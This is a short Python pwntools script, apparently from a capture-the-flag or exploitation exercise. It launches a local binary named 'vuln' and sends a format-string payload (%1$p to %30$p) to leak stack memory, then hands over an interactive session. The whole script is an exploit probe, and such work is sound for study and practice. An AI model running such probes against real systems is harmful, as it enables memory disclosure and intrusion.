from pwn import *

p = process('./vuln')

p.recvuntil(b'>> ')
payload = b'AAAA.' + b'.'.join([f'%{i}$p'.encode() for i in range(1, 31)])
p.sendline(payload)
p.interactive()
